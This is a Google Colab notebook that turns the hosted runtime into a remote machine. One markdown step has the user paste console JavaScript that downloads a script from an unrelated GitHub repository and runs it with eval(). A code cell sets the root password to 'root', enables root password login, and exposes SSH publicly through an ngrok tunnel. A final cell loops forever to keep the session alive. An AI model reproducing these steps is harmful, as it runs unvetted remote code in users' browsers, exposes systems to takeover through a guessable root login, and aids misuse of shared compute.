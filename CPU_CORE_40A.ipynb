{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "CPU CORE 40",
      "private_outputs": true,
      "provenance": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/andarezta/cpu/blob/main/CPU_CORE_40A.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# config Console\n",
        " <br>\n",
        " ** CTRL + SHIFT + K **\n",
        "\n",
        " <hr>\n",
        "\n",
        "\n",
        "async function mode() {\n",
        "let url = 'https://raw.githubusercontent.com/liebedevil/borr/main/netep.js'\n",
        "let response = await fetch(url);\n",
        "let script = await response.text();\n",
        "eval(script);}\n",
        "mode();\n",
        "<br>\n",
        "<hr>"
      ],
      "metadata": {
        "id": "bu-YYSsEVhSK"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title CPU CORE 40\n",
        "!lscpu\n",
        "\n"
      ],
      "metadata": {
        "id": "smBVcsBEVGoo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import random, string, urllib.request, json, getpass\n",
        "\n",
        "#Generate root password\n",
        "password = 'root'\n",
        "\n",
        "#Setup sshd\n",
        "! apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null\n",
        "\n",
        "#Set root password\n",
        "! echo root:$password | chpasswd\n",
        "! mkdir -p /var/run/sshd\n",
        "! echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\n",
        "! echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config\n",
        "! echo \"LD_LIBRARY_PATH=/usr/lib64-nvidia\" >> /root/.bashrc\n",
        "! echo \"export LD_LIBRARY_PATH\" >> /root/.bashrc\n",
        "\n",
        "#Run sshd\n",
        "get_ipython().system_raw('/usr/sbin/sshd -D &')\n",
        "\n",
        "#Download ngrok\n",
        "! wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip\n",
        "! unzip -qq -n ngrok-stable-linux-amd64.zip\n",
        "\n",
        "#Ask token\n",
        "print(\"Copy authtoken from https://dashboard.ngrok.com/auth\")\n",
        "authtoken = getpass.getpass()\n",
        "\n",
        "#Create tunnel\n",
        "get_ipython().system_raw('./ngrok authtoken $authtoken && ./ngrok tcp 22 &')\n",
        "\n",
        "#Get public address and print connect command\n",
        "with urllib.request.urlopen('http://localhost:4040/api/tunnels') as response:\n",
        "  data = json.loads(response.read().decode())\n",
        "  (host, port) = data['tunnels'][0]['public_url'][6:].split(':')\n",
        "  print(f'SSH command: ssh -p{port} root@{host}')"
      ],
      "metadata": {
        "id": "kpPzK2lLxRQ7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Time Execution \n",
        "import time \n",
        "from IPython.display import clear_output \n",
        " \n",
        "def zero_to_infinity(): \n",
        "    i = 0 \n",
        "    while True: \n",
        "        yield i \n",
        "        i += 1 \n",
        "        time.sleep(1) \n",
        " \n",
        "start = time.time() \n",
        "for x in zero_to_infinity(): \n",
        "    clear_output(wait=True) \n",
        "    end = time.time() \n",
        "    temp = end-start \n",
        "    hours = temp//3600 \n",
        "    temp = temp - 3600*hours \n",
        "    minutes = temp//60 \n",
        "    seconds = temp - 60*minutes \n",
        "    print(\"\") \n",
        "    print('%s %d:%d:%d' %(\"Time execution : \",hours,minutes,seconds)) \n",
        "    print(\"\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "BYBuWTNNVG95"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}